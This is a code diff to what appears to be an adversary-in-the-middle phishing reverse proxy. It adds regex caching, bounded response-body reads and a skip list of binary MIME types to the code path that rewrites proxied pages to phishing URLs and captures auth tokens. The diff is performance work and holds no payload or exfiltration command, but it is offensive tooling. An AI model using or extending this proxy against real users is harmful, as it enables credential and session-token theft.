@@ -97,6 +97,12 @@ type HttpProxy struct {
 	jsInspector       *jsinspect.Middleware
 	outboundTransport *utlstransport.Transport
 	trustProxyHeaders bool
+	// subFilterRegexCache caches compiled sub_filter regexes keyed by their
+	// fully macro-expanded pattern, so the OnResponse hot path compiles each
+	// distinct pattern once instead of on every proxied response. Guarded by
+	// sync.Map rather than phishlet state since another area of the
+	// codebase owns *Phishlet - see the comment on compileSubFilterRegex.
+	subFilterRegexCache sync.Map
 }
 
 // CampaignEventSink is the narrow relational boundary used by the proxy. The
@@ -1140,7 +1146,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			// modify received body
-			body, err := ioutil.ReadAll(resp.Body)
+			//
+			// Read through a bounded LimitReader so a large media file or
+			// software download can't force the whole payload into memory.
+			// If the body turns out to be larger than
+			// maxInterceptedBodySize, none of the rewrite passes below run
+			// for it, and the bytes already buffered are stitched back onto
+			// whatever is still unread on resp.Body so the response reaches
+			// the client byte-for-byte - never truncated.
+			body, bodyTooLargeToIntercept, remainder, err := readBoundedResponseBody(resp.Body, maxInterceptedBodySize)
+			if bodyTooLargeToIntercept {
+				resp.Body = ioutil.NopCloser(remainder)
+			}
 			jsInspectInjected := false
 
 			if pl != nil {
@@ -1229,58 +1246,65 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			mime := strings.Split(resp.Header.Get("Content-type"), ";")[0]
-			if err == nil {
+			if err == nil && !bodyTooLargeToIntercept {
 				origBodyLen := len(body)
-				for site, pl := range p.cfg.phishlets {
-					if p.cfg.IsSiteEnabled(site) {
-						// handle sub_filters
-						sfs, ok := pl.subfilters[req_hostname]
-						if ok {
-							for _, sf := range sfs {
-								var param_ok bool = true
-								if s, ok := p.getSession(ps.SessionId); ok {
-									var params []string
-									for k := range s.Params {
-										params = append(params, k)
-									}
-									if len(sf.with_params) > 0 {
-										param_ok = false
-										for _, param := range sf.with_params {
-											if stringExists(param, params) {
-												param_ok = true
-												break
+				// Binary MIME types (images, video, fonts, archives, ...)
+				// can never contain a sub_filter/auto_filter target, so
+				// skip the whole per-phishlet rewrite loop for them rather
+				// than iterating every enabled phishlet's filters only to
+				// have each one's own MIME check reject it anyway.
+				if isRewritableBodyMime(mime) {
+					for site, pl := range p.cfg.phishlets {
+						if p.cfg.IsSiteEnabled(site) {
+							// handle sub_filters
+							sfs, ok := pl.subfilters[req_hostname]
+							if ok {
+								for _, sf := range sfs {
+									var param_ok bool = true
+									if s, ok := p.getSession(ps.SessionId); ok {
+										var params []string
+										for k := range s.Params {
+											params = append(params, k)
+										}
+										if len(sf.with_params) > 0 {
+											param_ok = false
+											for _, param := range sf.with_params {
+												if stringExists(param, params) {
+													param_ok = true
+													break
+												}
 											}
 										}
 									}
-								}
-								if stringExists(mime, sf.mime) && (!sf.redirect_only || sf.redirect_only && redirect_set) && param_ok {
-									phish_hostname, _ := p.replaceHostWithPhished(combineHost(sf.subdomain, sf.domain))
-									phish_sub, _ := p.getPhishSub(phish_hostname)
-									phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
+									if stringExists(mime, sf.mime) && (!sf.redirect_only || sf.redirect_only && redirect_set) && param_ok {
+										phish_hostname, _ := p.replaceHostWithPhished(combineHost(sf.subdomain, sf.domain))
+										phish_sub, _ := p.getPhishSub(phish_hostname)
+										phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
 
-									re_s := expandSubFilterPattern(sf.regexp, sf.subdomain, sf.domain, p.cfg.GetBaseDomain())
-									replace_s := expandSubFilterReplacement(sf.replace, sf.subdomain, sf.domain, p.cfg.GetBaseDomain(), phish_hostname, phish_sub, phishDomain, ok)
+										re_s := expandSubFilterPattern(sf.regexp, sf.subdomain, sf.domain, p.cfg.GetBaseDomain())
+										replace_s := expandSubFilterReplacement(sf.replace, sf.subdomain, sf.domain, p.cfg.GetBaseDomain(), phish_hostname, phish_sub, phishDomain, ok)
 
-									if re, err := regexp.Compile(re_s); err == nil {
-										body = applySubFilterRegex(body, re, replace_s)
-									} else {
-										log.Error("regexp failed to compile: `%s`", sf.regexp)
+										if re, err := p.compileSubFilterRegex(re_s); err == nil {
+											body = applySubFilterRegex(body, re, replace_s)
+										} else {
+											log.Error("regexp failed to compile: `%s`", sf.regexp)
+										}
 									}
 								}
 							}
-						}
 
-						// handle auto filters (if enabled)
-						if stringExists(mime, p.auto_filter_mimes) {
-							for _, ph := range pl.proxyHosts {
-								if req_hostname == combineHost(ph.orig_subdomain, ph.domain) {
-									if ph.auto_filter {
-										body = p.patchUrls(pl, body, CONVERT_TO_PHISHING_URLS)
+							// handle auto filters (if enabled)
+							if stringExists(mime, p.auto_filter_mimes) {
+								for _, ph := range pl.proxyHosts {
+									if req_hostname == combineHost(ph.orig_subdomain, ph.domain) {
+										if ph.auto_filter {
+											body = p.patchUrls(pl, body, CONVERT_TO_PHISHING_URLS)
+										}
 									}
 								}
 							}
+							body = []byte(removeObfuscatedDots(string(body)))
 						}
-						body = []byte(removeObfuscatedDots(string(body)))
 					}
 				}
 
@@ -1628,6 +1652,99 @@ func setModifiedBodyFraming(resp *http.Response, body []byte) {
 // jsInspector injects same-length content.
 func shouldReconcileBodyFraming(jsInspectInjected bool, origBodyLen, newBodyLen int) bool {
 	return jsInspectInjected || newBodyLen != origBodyLen
+}
+
+// compileSubFilterRegex returns a compiled regex for the fully
+// macro-expanded sub_filter pattern, compiling it once and caching the
+// result on p.subFilterRegexCache. Every proxied response for an enabled
+// phishlet previously re-ran regexp.Compile for every configured
+// sub_filter; for a busy engagement that's the same handful of patterns
+// recompiled on every single request.
+//
+// A pattern that fails to compile is never cached: it is retried (and
+// still fails) on every call, exactly matching the pre-caching behavior of
+// always attempting - and always failing - to compile a broken pattern.
+// That keeps the caller's fallthrough (log the same error, skip that
+// filter) unchanged; a bad pattern does not become a hard failure.
+func (p *HttpProxy) compileSubFilterRegex(pattern string) (*regexp.Regexp, error) {
+	if v, ok := p.subFilterRegexCache.Load(pattern); ok {
+		return v.(*regexp.Regexp), nil
+	}
+	re, err := regexp.Compile(pattern)
+	if err != nil {
+		return nil, err
+	}
+	// LoadOrStore instead of Store: if another goroutine compiled the same
+	// pattern concurrently, keep whichever copy won the race - they are
+	// equivalent, so there's nothing to reconcile.
+	actual, _ := p.subFilterRegexCache.LoadOrStore(pattern, re)
+	return actual.(*regexp.Regexp), nil
+}
+
+// maxInterceptedBodySize bounds how much of a response body is buffered
+// into memory for the rewrite pipeline (sub_filter/auto_filter, dot
+// de-obfuscation, jsInspector/opengraph/script injection, and body
+// auth-token capture). A response body larger than this is passed through
+// to the client unmodified rather than either buffering an unbounded
+// amount of memory or truncating the client's download - see
+// readBoundedResponseBody below.
+const maxInterceptedBodySize = 10 * 1024 * 1024 // 10 MiB
+
+// readBoundedResponseBody reads up to maxSize+1 bytes of r into memory and
+// reports whether the body is larger than maxSize. When it is, none of the
+// pipeline's rewrite passes are safe to run against the partial bytes
+// already read - the returned remainder reader instead serves those
+// already-read bytes followed by whatever is still unread on r, so the
+// caller can relay the full, unmodified body to the client while only
+// ever having buffered maxSize+1 bytes of it in memory. remainder is nil
+// when oversize is false; the caller is expected to leave resp.Body as-is
+// in that case and use body directly.
+func readBoundedResponseBody(r io.Reader, maxSize int64) (body []byte, oversize bool, remainder io.Reader, err error) {
+	body, err = ioutil.ReadAll(io.LimitReader(r, maxSize+1))
+	if err != nil {
+		return body, false, nil, err
+	}
+	if int64(len(body)) > maxSize {
+		return body, true, io.MultiReader(bytes.NewReader(body), r), nil
+	}
+	return body, false, nil, nil
+}
+
+// nonRewritableBodyMimes lists response MIME types that are binary and can
+// never contain a sub_filter/auto_filter target, so running the
+// regex-driven rewrite pass (and the per-phishlet loop that drives it) is
+// pure waste for them. This is deliberately an allow-list of well-known
+// binary formats rather than a prefix rule like "image/*", because a type
+// such as image/svg+xml is XML/text and can legitimately be a sub_filter
+// target. Reading the body and capturing body auth tokens is unaffected -
+// a phishlet's bodyAuthTokens search pattern carries no MIME restriction
+// today, so narrowing that too would be a behavior change beyond this
+// optimization's scope.
+var nonRewritableBodyMimes = map[string]bool{
+	"image/png": true, "image/jpeg": true, "image/jpg": true, "image/gif": true,
+	"image/webp": true, "image/x-icon": true, "image/vnd.microsoft.icon": true,
+	"image/bmp": true, "image/tiff": true, "image/heic": true, "image/avif": true,
+
+	"video/mp4": true, "video/webm": true, "video/ogg": true, "video/quicktime": true,
+	"video/x-msvideo": true, "video/mpeg": true,
+
+	"audio/mpeg": true, "audio/ogg": true, "audio/wav": true, "audio/webm": true,
+
+	"font/woff": true, "font/woff2": true, "font/ttf": true, "font/otf": true,
+	"application/font-woff": true, "application/font-woff2": true,
+	"application/vnd.ms-fontobject": true,
+
+	"application/zip": true, "application/gzip": true, "application/x-gzip": true,
+	"application/x-tar": true, "application/x-7z-compressed": true,
+	"application/x-rar-compressed": true, "application/pdf": true,
+	"application/octet-stream": true, "application/wasm": true,
+}
+
+// isRewritableBodyMime reports whether mime could plausibly contain a
+// sub_filter or auto_filter target, i.e. whether the body-rewrite passes
+// are worth running at all for it.
+func isRewritableBodyMime(mime string) bool {
+	return !nonRewritableBodyMimes[mime]
 }
 
 func (p *HttpProxy) waitForRedirectUrl(session_id string) (string, bool) {
